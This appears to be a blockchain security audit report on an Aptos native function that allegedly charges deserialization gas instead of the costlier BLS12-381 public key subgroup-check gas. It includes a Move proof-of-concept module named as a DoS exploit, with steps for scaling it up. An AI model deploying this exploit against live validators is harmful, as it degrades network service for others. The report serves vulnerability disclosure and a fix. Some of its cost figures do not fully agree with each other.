# Audit Report

## Title
BLS12-381 Public Key Subgroup Check Gas Undercharge Enabling Validator DoS

## Summary
The native function `bls12381_pk_subgroub_check()` charges only 400,684 gas units for deserialization when it should charge 1,360,120 gas units for the expensive prime-order subgroup membership check operation. This ~3.4x gas undercharge enables attackers to flood validators with computationally expensive cryptographic operations while paying minimal transaction fees, causing validator resource exhaustion and network slowdowns.

## Finding Description
The vulnerability exists in the BLS12-381 public key validation native function implementation. When validating a public key, the system must verify that the elliptic curve point belongs to the correct prime-order subgroup—a cryptographically expensive operation taking approximately 39 microseconds per check. [1](#0-0) 

The function `bls12381_pk_subgroub_check()` incorrectly charges the `BLS12381_PER_PUBKEY_DESERIALIZE` gas parameter instead of `BLS12381_PER_PUBKEY_SUBGROUP_CHECK`. The gas schedule clearly defines different costs for these operations: [2](#0-1) 

The native function is exposed through the public Move API: [3](#0-2) 

The function documentation explicitly states it should charge for subgroup checking: [4](#0-3) 

Contrast this with the signature subgroup check implementation, which correctly uses the appropriate gas parameter: [5](#0-4) 

**Attack Execution:**
1. Attacker crafts transactions calling `aptos_std::bls12381::public_key_from_bytes()` with various 48-byte inputs
2. Each call triggers the native `validate_pubkey_internal()` function
3. Validator nodes perform expensive elliptic curve subgroup membership checks (39 μs each)
4. Attacker pays only 400,684 gas instead of 1,360,120 gas—a 959,436 gas undercharge per operation
5. By submitting thousands of such transactions, attacker forces validators to waste CPU cycles on underpriced cryptographic operations

## Impact Explanation
This is a **HIGH severity** vulnerability per the Aptos bug bounty program, qualifying as "Validator node slowdowns." 

**Quantified Impact:**
- Gas undercharge: 959,436 internal gas units per subgroup check (~70.5% discount)
- Computational cost: ~39 microseconds per operation (as documented in code)
- With 1000 operations: attackers pay for ~400M gas but consume computational resources worth ~1.36B gas
- This represents a 3.4x asymmetric cost attack ratio

The vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The gas mechanism exists to prevent exactly this type of resource exhaustion attack, but the incorrect gas charging undermines this protection.

While this doesn't directly cause consensus violations or fund loss, sustained exploitation could degrade validator performance, increase block production latency, and potentially impact network liveness if validators become CPU-bound processing these underpriced operations.

## Likelihood Explanation
**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **Easy to exploit**: Any user can submit transactions calling the public Move function `public_key_from_bytes()`
2. **No special privileges required**: Works with standard transaction submission
3. **Low attack cost**: Attacker pays ~70% less gas than the actual computational burden
4. **Immediate impact**: Each transaction immediately forces validators to perform expensive operations
5. **Difficult to detect**: Legitimate use of BLS key validation is indistinguishable from malicious exploitation
6. **No rate limiting**: Transaction throughput limited only by gas payment, which is artificially low

The attack can be automated and scaled to maximize validator resource consumption while minimizing attacker costs.

## Recommendation
Change line 158 in the `bls12381_pk_subgroub_check()` function to charge the correct gas parameter:

**Current (incorrect):**
```rust
context.charge(BLS12381_PER_PUBKEY_DESERIALIZE * NumArgs::one())?;
```

**Fixed:**
```rust
context.charge(BLS12381_PER_PUBKEY_SUBGROUP_CHECK * NumArgs::one())?;
```

This aligns the implementation with:
1. The function's documented gas cost specification
2. The correct gas parameter defined in the gas schedule
3. The pattern used in the analogous signature subgroup check function

Additionally, audit all other native cryptographic functions to ensure gas parameters match the actual operations being performed, not just the input processing steps.

## Proof of Concept

```move
module attacker::dos_exploit {
    use aptos_std::bls12381;
    use std::vector;

    /// Exploit the BLS12-381 subgroup check gas undercharge
    /// Call this function repeatedly to cause validator CPU exhaustion
    /// while paying only ~29% of the actual computational cost
    public entry fun exploit_subgroup_check_undercharge(iterations: u64) {
        let i = 0;
        while (i < iterations) {
            // Craft a 48-byte public key candidate
            let pk_bytes = vector::empty<u8>();
            let j = 0;
            while (j < 48) {
                vector::push_back(&mut pk_bytes, ((i + j) % 256 as u8));
                j = j + 1;
            };
            
            // This call performs expensive subgroup checking
            // but only charges for deserialization (~400K gas instead of ~1.36M gas)
            let _ = bls12381::public_key_from_bytes(pk_bytes);
            
            i = i + 1;
        };
    }

    #[test(attacker = @0x123)]
    fun test_gas_undercharge(attacker: &signer) {
        // With 100 iterations:
        // - Expected gas: 100 * 1,360,120 = 136,012,000 internal gas
        // - Actual charged: 100 * 400,684 = 40,068,400 internal gas  
        // - Undercharge: 95,943,600 internal gas (70.5% discount)
        exploit_subgroup_check_undercharge(100);
    }
}
```

To demonstrate the attack:
1. Deploy the module above
2. Submit transactions calling `exploit_subgroup_check_undercharge(1000)` 
3. Monitor validator CPU usage - will spike due to elliptic curve operations
4. Compare gas charged vs computational cost - observe ~3.4x discrepancy
5. Scale up iterations to amplify the asymmetric cost attack

**Notes**
The vulnerability exists because the wrong constant is used in a single line of code, but the impact is significant due to the computational expense of elliptic curve subgroup membership checking. This is a clear example of an asymmetric cost attack where gas metering fails to reflect actual resource consumption, enabling denial-of-service attacks against validator nodes.

### Citations

**File:** aptos-move/framework/src/natives/cryptography/bls12381.rs (L152-161)
```rust
/// Checks prime-order subgroup membership on a bls12381::PublicKey struct.
fn bls12381_pk_subgroub_check(
    pk: &bls12381::PublicKey,
    context: &mut SafeNativeContext,
) -> SafeNativeResult<bool> {
    // NOTE(Gas): constant-time; around 39 microseconds on Apple M1
    context.charge(BLS12381_PER_PUBKEY_DESERIALIZE * NumArgs::one())?;

    Ok(pk.subgroup_check().is_ok())
}
```

**File:** aptos-move/framework/src/natives/cryptography/bls12381.rs (L163-171)
```rust
/// Checks prime-order subgroup membership on a bls12381::Signature struct.
fn bls12381_sig_subgroub_check(
    sig: &bls12381::Signature,
    context: &mut SafeNativeContext,
) -> SafeNativeResult<bool> {
    context.charge(BLS12381_PER_SIG_SUBGROUP_CHECK * NumArgs::one())?;

    Ok(sig.subgroup_check().is_ok())
}
```

**File:** aptos-move/framework/src/natives/cryptography/bls12381.rs (L385-391)
```rust
 * native fun bls12381_validate_pubkey
 *
 *   gas cost: base_cost + per_pubkey_deserialize_cost +? per_pubkey_subgroup_check_cost
 *
 * where +? indicates that the expression stops evaluating there if the previous gas-charging step
 * failed
 **************************************************************************************************/
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/aptos_framework.rs (L174-176)
```rust
        [bls12381_per_pubkey_deserialize: InternalGasPerArg, "bls12381.per_pubkey_deserialize", 400684],
        [bls12381_per_pubkey_aggregate: InternalGasPerArg, "bls12381.per_pubkey_aggregate", 15439],
        [bls12381_per_pubkey_subgroup_check: InternalGasPerArg, "bls12381.per_pubkey_subgroup_check", 1360120],
```

**File:** aptos-move/framework/aptos-stdlib/sources/cryptography/bls12381.move (L86-95)
```text
    /// Creates a new public key from a sequence of bytes.
    public fun public_key_from_bytes(bytes: vector<u8>): Option<PublicKey> {
        if (validate_pubkey_internal(bytes)) {
            option::some(PublicKey {
                bytes
            })
        } else {
            option::none<PublicKey>()
        }
    }
```
